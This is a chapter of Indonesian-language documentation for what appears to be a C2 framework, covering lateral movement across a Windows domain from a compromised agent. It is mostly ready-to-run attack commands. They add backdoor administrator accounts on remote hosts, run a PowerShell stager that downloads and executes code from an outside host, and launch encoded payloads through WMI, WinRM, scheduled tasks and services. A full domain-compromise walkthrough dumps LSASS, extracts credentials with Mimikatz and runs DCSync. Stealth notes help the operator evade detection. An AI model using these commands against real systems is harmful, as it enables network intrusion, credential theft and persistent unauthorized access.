# 22 — Lateral Movement

> Teknik untuk berpindah dari satu host ke host lain di jaringan internal
> menggunakan agent yang sudah terkompromi sebagai pivot point.

---

## Overview

```
[Operator] → C2 Server → [Agent: DESKTOP-01] → [WMI/WinRM/Schtask] → [DC01]
                                                                     → [FS01]
                                                                     → [DB01]
```

Agent menjalankan perintah di **remote host** menggunakan kredensial yang sudah didapat
(pass-the-hash, Kerberos ticket, plaintext creds dari LSASS/browser dump).

Semua teknik di bawah menggunakan **built-in Windows tools** — tidak ada binary tambahan
yang perlu di-drop ke disk.

---

## Teknik yang Tersedia

| Command | Metode | Tool | Output | Butuh Admin |
|---------|--------|------|--------|-------------|
| `lateral wmi` | WMI process spawn | `wmic.exe` | Fire-and-forget | Ya |
| `lateral winrm` | PSRemoting | `powershell.exe` | Captured | Ya (+ WinRM enabled) |
| `lateral schtask` | Remote schtask | `schtasks.exe` | Fire-and-forget | Ya |
| `lateral service` | Remote service | `sc.exe` | Fire-and-forget | Ya |

---

## lateral wmi

Eksekusi command via WMI `Win32_Process.Create`. Tidak membuat service, tidak butuh
WinRM. Output tidak di-capture — gunakan redirect ke file lalu download, atau gunakan
`lateral winrm` jika butuh output.

```
lateral wmi <agent-id> <rhost> <command> [--user U] [--domain D] [--pass P] [--wait]
```

### Contoh

```bash
# Dengan credentials
lateral wmi 7d019eb7 192.168.1.100 \
  "cmd.exe /c whoami > C:\Temp\out.txt" \
  --user Administrator --domain CORP --pass 'Admin@Corp2026' --wait

# Dengan current token (setelah token steal dari domain admin)
lateral wmi 7d019eb7 DC01 "powershell -enc <B64_STAGER>"

# Tambah user lokal di remote host
lateral wmi 7d019eb7 192.168.1.50 \
  "net user backdoor P@ss123 /add && net localgroup administrators backdoor /add" \
  --user Administrator --domain CORP --pass 'P@ss'
```

**Output:**
```
[+] Lateral wmi queued → 192.168.1.100  (cmd 3f4a...)
    [i] Waiting for result (timeout 120s)...
    [+] ExecutionCode = 0; ProcessId = 4712
```

---

## lateral winrm

Eksekusi via PowerShell `Invoke-Command` (WinRM/PSRemoting). **Output di-capture** —
cocok untuk recon, enumeration, atau operasi yang butuh hasil.

Target harus punya WinRM enabled (`Enable-PSRemoting -Force` atau GPO).

```
lateral winrm <agent-id> <rhost> <command> [--user U] [--domain D] [--pass P] [--wait]
```

### Contoh

```bash
# Recon cepat di DC
lateral winrm 7d019eb7 DC01 \
  "hostname; whoami; (Get-ADUser -Filter *).Count" \
  --user john.doe --domain CORP --pass 'CorpMail@2026!' --wait

# Dump net user dari remote host
lateral winrm 7d019eb7 192.168.1.50 "net user" --wait

# Jalankan stager dari remote (output minimal)
lateral winrm 7d019eb7 DC01 \
  "powershell -w hidden -enc <B64>" \
  --user Administrator --domain CORP --pass 'Admin@Corp2026' --wait
```

**Output:**
```
[+] Lateral winrm queued → DC01  (cmd 8b2c...)
    [i] Waiting for result (timeout 120s)...
    [+] Command completed:

    DC01
    CORP\john.doe
    47
```

---

## lateral schtask

Buat scheduled task di remote host, jalankan langsung, lalu hapus. Berguna ketika
WMI diblokir tapi SMB/RPC port 135+dynamic masih terbuka.

Fire-and-forget — output tidak di-capture.

```
lateral schtask <agent-id> <rhost> <command> [--user U] [--domain D] [--pass P] [--wait]
```

### Contoh

```bash
# Jalankan stager via schtask di file server
lateral schtask 7d019eb7 FS01 \
  "powershell -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.5.1/s')\"" \
  --user Administrator --domain CORP --pass 'Admin@Corp' --wait

# Buat user admin local di remote
lateral schtask 7d019eb7 192.168.1.100 \
  "cmd.exe /c net user hacker P@ss123 /add & net localgroup administrators hacker /add"
```

**Output:**
```
[+] Lateral schtask queued → FS01  (cmd 1a3b...)
    [i] Waiting for result (timeout 120s)...
    [+] Scheduled task MicrosoftEdgeUp4821 created and executed on FS01 (\\FS01)
```

---

## lateral service

Buat Windows service di remote host via SCM RPC (seperti PsExec), jalankan, lalu hapus.
Paling agresif — AV sering alert pada service creation pattern.

Fire-and-forget.

```
lateral service <agent-id> <rhost> <command> [--wait]
```

### Contoh

```bash
lateral service 7d019eb7 192.168.1.100 \
  "cmd.exe /c C:\Temp\payload.exe" --wait

# Dengan binary yang sudah ada di target (via upload dulu)
files upload 7d019eb7 ./payload.exe "C:\Temp\payload.exe"
lateral service 7d019eb7 DC01 "C:\Temp\payload.exe" --wait
```

---

## Skenario End-to-End: Domain Compromise via Agent

```bash
# ── Step 1: Dump LSASS dari agent ──────────────────────────────────────────────
creds lsass 7d019eb7 --output C:\Temp\lsass.dmp --wait
files download 7d019eb7 "C:\Temp\lsass.dmp" ./lsass.dmp

# ── Step 2: Parse dengan Mimikatz lokal ────────────────────────────────────────
# (di mesin operator, di luar C2)
mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit

# Dapat: CORP\john.doe : CorpMail@2026!  (Domain Admin)

# ── Step 3: Scan untuk DC ─────────────────────────────────────────────────────
netscan 7d019eb7 --targets 192.168.1.0/24 --ports 88,389,445,3389 --wait
# → 192.168.1.100  88/389/445 open  (DC01)

# ── Step 4: Lateral ke DC via WMI ─────────────────────────────────────────────
# Drop stager ke temp dulu (via stage delivery)
lateral wmi 7d019eb7 DC01 \
  "powershell -w hidden -enc <B64_STAGER>" \
  --user john.doe --domain CORP --pass 'CorpMail@2026!'

# ── Step 5: Agent baru dari DC ────────────────────────────────────────────────
agents list
# 7d019eb7  DESKTOP-01  john.doe   online  30s ago
# 4f1b8e23  DC01        SYSTEM     online  8s ago   ← DA level!

# ── Step 6: DCSync dari agent di DC ──────────────────────────────────────────
# (menggunakan token SYSTEM di DC01)
cmd 4f1b8e23 "C:\Windows\Temp\mimikatz.exe \"lsadump::dcsync /domain:CORP /all\" exit"
```

---

## OPSEC Notes

| Teknik | Visibility | Artefact | Deteksi |
|--------|-----------|----------|---------|
| WMI | Event 4688 (remote process) | Tidak ada | WMI abuse signatures |
| WinRM | Event 4688 + PS script block | Tidak ada | PSRemoting logging |
| Schtask | Event 4698 (task created) | Task XML (tapi dihapus) | Schtask remote creation |
| Service | Event 7045 (service install) | SCM entry (dihapus) | PsExec-like detection |

**Rekomendasi urutan stealth:**
1. WinRM (output-nya rapih, event ID sama dengan normal admin)
2. WMI (fire-and-forget, event 4688 sering ada)
3. Schtask (event 4698 spesifik, tapi tool bawaan)
4. Service (paling noisy — AV sering alert)

---

**Selanjutnya:** [16 — Red Team Scenarios](16-scenarios.md)
